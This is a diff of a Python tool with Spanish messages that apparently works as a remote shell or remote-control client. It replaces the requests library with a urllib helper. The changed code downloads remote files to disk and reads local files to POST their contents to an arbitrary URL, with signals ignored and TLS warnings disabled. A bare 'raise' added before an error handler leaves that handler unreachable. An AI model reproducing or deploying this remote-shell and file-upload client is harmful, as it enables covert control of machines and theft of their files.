@@ -25,7 +25,7 @@
 import socket
 import shlex
 import re
-import requests
+from urllib import request, parse
 from time import sleep
 from urllib3 import disable_warnings
 from signal import signal, SIG_IGN
@@ -100,9 +100,26 @@ def shell():
 
     return('({}): {}@{}:{}$ '.format(getpid(), user, IP, getcwd()))
 
+def simple_requests(host, method=None, data=None, return_body=True):
+
+    if (data != None):
+        
+        if not (isinstance(data, dict)):
+
+            raise TypeError('Los parámetros deben ser un diccionario')
+
+        else:
+
+            data = parse.urlencode(data).encode('utf-8')
+
+    construct = request.Request(host, method=method, data=data)
+    response = request.urlopen(construct)
+
+    return(response.read() if (return_body) else None)
+
 def check_url(url):
 
-    verify = re.match(r'(http|https)://\w+(:[\d]{1,5})*/{1}\w+(\.*\w*)*', url)
+    verify = re.match(r'(http|https)://\w+(:[\d]{1,5})*/{1}.+(\.*.*)*', url)
 
     if (verify):
 
@@ -235,9 +252,11 @@ def main():
 
                                         with open(save_this_name, 'wb') as file_object:
 
-                                            file_object.write(requests.get(verify[1], verify=False, headers=config.HEADERS).content)
+                                            file_object.write(simple_requests(verify[1]))
 
                                     except Exception as Except:
+
+                                        raise
 
                                         data = 'Ocurrio una excepción al descargar a "{}". Excepción: "{}"'.format(save_this_name, Except)
 
@@ -281,14 +300,12 @@ def main():
 
                                         with open(url[1], 'rb') as file_object:
 
-                                            requests.post(
-                                                            url[0],
-                                                            verify=False,
-                                                            headers=config.HEADERS,
-                                                            data={
-                                                                config.FILENAME:basename(url[1]),
-                                                                config.FILECONTENT:file_object.read()
-                                                            })
+                                            simple_requests(url[0], 'POST', { 
+                                                
+                                                                                config.FILENAME:basename(url[1]),
+                                                                                config.FILECONTENT:file_object.read()
+                                                                                
+                                                                            }, False)
 
                                     except Exception as Except:
 
